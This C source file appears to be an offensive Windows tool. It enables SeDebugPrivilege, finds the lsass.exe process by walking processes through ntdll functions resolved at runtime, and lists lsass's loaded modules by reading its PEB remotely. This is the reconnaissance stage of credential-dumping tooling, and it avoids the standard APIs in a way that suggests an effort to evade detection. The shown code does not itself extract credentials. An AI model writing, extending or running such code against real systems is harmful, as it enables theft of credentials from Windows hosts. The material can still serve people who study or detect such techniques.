#include <stdio.h>
#include <windows.h>


// Constants
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define TOKEN_QUERY 0x0008
#define TOKEN_ADJUST_PRIVILEGES 0x0020
#define MAX_MODULES 1024


// Structs
typedef struct _TOKEN_PRIVILEGES_STRUCT {
    DWORD PrivilegeCount;
    LUID Luid;
    DWORD Attributes;
} TOKEN_PRIVILEGES_STRUCT, * PTOKEN_PRIVILEGES_STRUCT;

typedef struct {
    char base_dll_name[MAX_PATH];
    char full_dll_path[MAX_PATH];
    void* dll_base;
} ModuleInformation;


// Enums
typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
} PROCESSINFOCLASS;


// Functions
typedef NTSTATUS(WINAPI* NtOpenProcessTokenFn)(HANDLE, DWORD, PHANDLE);
typedef NTSTATUS(WINAPI* NtAdjustPrivilegesTokenFn)(HANDLE, BOOL, PTOKEN_PRIVILEGES_STRUCT, DWORD, PVOID, PVOID);
typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE);
typedef NTSTATUS(WINAPI* NtGetNextProcessFn)(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
typedef NTSTATUS(WINAPI* NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);


// Skeletons
char* GetProcNameFromHandle(HANDLE handle);
char* ReadRemoteWStr(HANDLE processHandle, PVOID address);
PVOID ReadRemoteIntPtr(HANDLE processHandle, PVOID address);


// Get SeDebugPrivilege privilege
void EnableDebugPrivileges() {
    HANDLE currentProcess = GetCurrentProcess();
    HANDLE tokenHandle = NULL;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        exit(-1);
    }

    NtOpenProcessTokenFn NtOpenProcessToken = (NtOpenProcessTokenFn)GetProcAddress(hNtdll, "NtOpenProcessToken");
    NtAdjustPrivilegesTokenFn NtAdjustPrivilegesToken = (NtAdjustPrivilegesTokenFn)GetProcAddress(hNtdll, "NtAdjustPrivilegesToken");
    NtCloseFn NtClose = (NtCloseFn)GetProcAddress(hNtdll, "NtClose");

    if (!NtOpenProcessToken || !NtAdjustPrivilegesToken || !NtClose) {
        printf("[-] Error getting function addresses.\n");
        exit(-1);
    }

    // Open the process token
    NTSTATUS ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
    if (ntstatus != 0) {
        printf("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
        exit(-1);
    }

    // Set the privilege
    TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Luid.LowPart = 20; // LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid) would normally be used to get this value
    tokenPrivileges.Luid.HighPart = 0;
    tokenPrivileges.Attributes = 0x00000002;

    ntstatus = NtAdjustPrivilegesToken(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (ntstatus != 0) {
        printf("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X. Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue.\n", ntstatus);
        NtClose(tokenHandle);
        exit(-1);
    }

    // Close the handle
    if (tokenHandle != NULL) {
        NtClose(tokenHandle);
    }

    printf("[+] Debug privileges enabled successfully.\n");
}


ModuleInformation* add_module(ModuleInformation* list, int counter, ModuleInformation new_module) {
    static int size = MAX_MODULES;
    // If the list is full, reallocate memory to double the size
    if (counter >= size) {
        size *= 2;
        list = (ModuleInformation*)realloc(list, size * sizeof(ModuleInformation));
        if (list == NULL) {
            printf("[-] Memory allocation failed!\n");
            return NULL;
        }
    }
    list[counter] = new_module;
    return list;
}


ModuleInformation* CustomGetModuleHandle(HANDLE hProcess) {
    ModuleInformation* module_list = (ModuleInformation*)malloc(1024 * sizeof(ModuleInformation));
    int module_counter = 0;

    int process_basic_information_size = 48;
    int peb_offset = 0x8;
    int ldr_offset = 0x18;
    int inInitializationOrderModuleList_offset = 0x30;
    int flink_dllbase_offset = 0x20;
    int flink_buffer_fulldllname_offset = 0x40;
    int flink_buffer_offset = 0x50;

    BYTE pbi_byte_array[48];
    void* pbi_addr = (void*)pbi_byte_array;

    ////////////////////////////////
    // NtQueryInformationProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtQueryInformationProcessFn NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        printf("[-] Error getting NtQueryInformationProcess function address.\n");
        return NULL;
    }
    ////////////////////////////////

    ULONG ReturnLength;
    NTSTATUS ntstatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
    void* pebaddress = *(void**)peb_pointer;

    printf("[+] pbi_addr: \t0x%p \n", pbi_addr);
    printf("[+] peb pointer: \t0x%p\n", peb_pointer);
    printf("[+] peb address: \t0x%p\n", pebaddress);

    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);

    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

    printf("[+] ldr_pointer: \t0x%p\n", ldr_pointer);
    printf("[+] ldr_adress: \t0x%p\n", ldr_adress);
    printf("[+] next_flink: \t0x%p\n", next_flink);

    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        dll_base = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));

        void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));

        // printf("[+] next_flink: %p\n", next_flink);
        // printf("[+] buffer: %p\n", buffer);
        char* base_dll_name = ReadRemoteWStr(hProcess, buffer);
        // printf("[+] base dll name: %s\n", base_dll_name);

        // New ModuleInformation
        ModuleInformation new_module;
        strncpy_s(new_module.base_dll_name, base_dll_name, MAX_PATH - 1);


        //void* full_dll_name_addr = (char*)next_flink + flink_buffer_fulldllname_offset;
        void* full_dll_name_addr = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_fulldllname_offset));
        // printf("[+] full_dll_name_addr: %p\n", full_dll_name_addr);

        char* full_dll_name = ReadRemoteWStr(hProcess, full_dll_name_addr);
        // printf("[+] base dll name: %s\n", base_dll_name);
        // printf("[+] full dll name: %s\n", full_dll_name);

        // Complete ModuleInformation         
        strncpy_s(new_module.full_dll_path, full_dll_name, MAX_PATH - 1);
        new_module.dll_base = 0;
        add_module(module_list, module_counter, new_module);
        module_counter++;

        next_flink = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + 0x10));
    }

    return module_list;
}


// Read remote IntPtr (8-bytes)
PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    ///////////////////
    // Load NtQueryInformationProcess from Ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtReadVirtualMemoryFn NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    if (!NtReadVirtualMemory) {
        printf("[-] Error getting NtReadVirtualMemory function address.\n");
        return NULL;
    }
    ///////////////////

    BYTE buff[8];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
        return NULL;
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


// Read remote Unicode string
char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    ///////////////////
    // Load NtQueryInformationProcess from Ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtReadVirtualMemoryFn NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    if (!NtReadVirtualMemory) {
        printf("[-] Error getting NtReadVirtualMemory function address.\n");
        return NULL;
    }
    ///////////////////

    BYTE buff[256];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
    }

    static char unicode_str[128];
    int str_index = 0;

    for (int i = 0; i < sizeof(buff) - 1; i += 2) {
        if (buff[i] == 0 && buff[i + 1] == 0) {
            break;
        }
        wchar_t wch = *(wchar_t*)&buff[i];
        unicode_str[str_index++] = (char)wch;
    }
    unicode_str[str_index] = '\0';
    return unicode_str;
}


char* GetProcNameFromHandle(HANDLE process_handle) {
    const int process_basic_information_size = 48;
    const int peb_offset = 0x8;
    const int commandline_offset = 0x68;
    const int processparameters_offset = 0x20;

    /////////////////////
    // NtQueryInformationProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtQueryInformationProcessFn NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        printf("[-] Error getting NtQueryInformationProcess function address.\n");
        return NULL;
    }
    /////////////////////

    unsigned char pbi_byte_array[process_basic_information_size];
    void* pbi_addr = NULL;
    pbi_addr = (void*)pbi_byte_array;

    // Query process information
    ULONG returnLength;
    NTSTATUS ntstatus = NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    // Get PEB Base Address
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;

    // Get PEB->ProcessParameters
    PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);

    // Get ProcessParameters->CommandLine
    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);
    PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
    char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);

    /*
    // DEBUG
    printf("[+] pbi_addr: %p \n", pbi_addr);
    printf("[+] return length: %d \n", returnLength);
    printf("[+] peb pointer: %p\n", peb_pointer);
    printf("[+] peb address: %p\n", pebaddress);
    printf("[+] processparameters_pointer: %p\n", processparameters_pointer);
    printf("[+] processparameters_address: %p\n", processparameters_address);
    printf("[+] commandline_pointer: %p\n", commandline_pointer);
    printf("[+] commandline_address: %p\n", commandline_address);
    printf("[+] commandline_value: %s\n\n\n\n", commandline_value);
    */

    return commandline_value;
}


HANDLE GetProcessByName(const char* proc_name) {
    HANDLE aux_handle = NULL;
    /////////////////////
    // NtGetNextProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return NULL;
    }
    NtGetNextProcessFn NtGetNextProcess = (NtGetNextProcessFn)GetProcAddress(hNtdll, "NtGetNextProcess");
    if (!NtGetNextProcess) {
        printf("[-] Error getting NtGetNextProcess function address.\n");
        return NULL;
    }
    /////////////////////

    // Iterate processes
    while (NT_SUCCESS(NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle))) {
        char* current_proc_name = GetProcNameFromHandle(aux_handle);
        //printf("aux_handle: %d\n", aux_handle);
        //printf("[+] current_proc_name: %s\n ", current_proc_name);
        if (current_proc_name && strcmp(current_proc_name, proc_name) == 0) {
            return aux_handle;
        }
    }
    return NULL;
}


int main() {
    EnableDebugPrivileges();
    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
    printf("[+] hProcess:\t%p\n", hProcess);

    // List to get modules information
    ModuleInformation* moduleInformationList = CustomGetModuleHandle(hProcess);
    int module_counter = 0;
    for (int i = 0; i < MAX_MODULES; i++) {
        if (strcmp(moduleInformationList[i].base_dll_name, "")) {
            module_counter++;
            printf("%d %s (%s)\n", module_counter, moduleInformationList[i].base_dll_name, moduleInformationList[i].full_dll_path);
        }
    }
    printf("[+] Processed %d modules", module_counter);

    return 0;
}

